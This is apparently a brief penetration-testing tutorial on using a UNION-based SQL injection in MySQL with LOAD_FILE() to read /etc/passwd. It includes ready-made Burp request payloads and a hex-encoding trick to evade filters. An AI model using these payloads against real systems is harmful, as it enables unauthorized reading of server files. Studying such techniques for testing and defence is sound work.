# SQL Injection to Read Files on Target
If we find ourselves with a UNION based SQL Injection vulnerability, we can attempt to use the `LOAD_FILE()` function in MySQL to read and return a file as a string. 

For instance, in Burp:
```
GET
/users/nonexistentuser%20union%20select%20all%20LOAD_FILE("/etc/passwd")--%20-HTTP/1.1
Host ...
```
Here we have a UNION SELECT ALL injection on MySQL database from a poorly-written web application. Now, we may need to "hexifiy" the string for `/etc/passwd` if the result does not return an error or any data. This is caused by filters and restrictions. To do this, we can use Python as so,
```
root@attacker-machine:~# python3
>>> import binascii
>>> binascii.hexlify(b"/etc/passwd")
b'2f6574632f706173737764'
>>> 
```
Then, we simply place that into the `LOAD_FILE()` function as the only argum,ent as so in Burp:
```
GET
/users/nonexistentuser%20union%20select%20all%20LOAD_FILE(0x2f6574632f706173737764)--%20-HTTP/1.1
Host ...
```
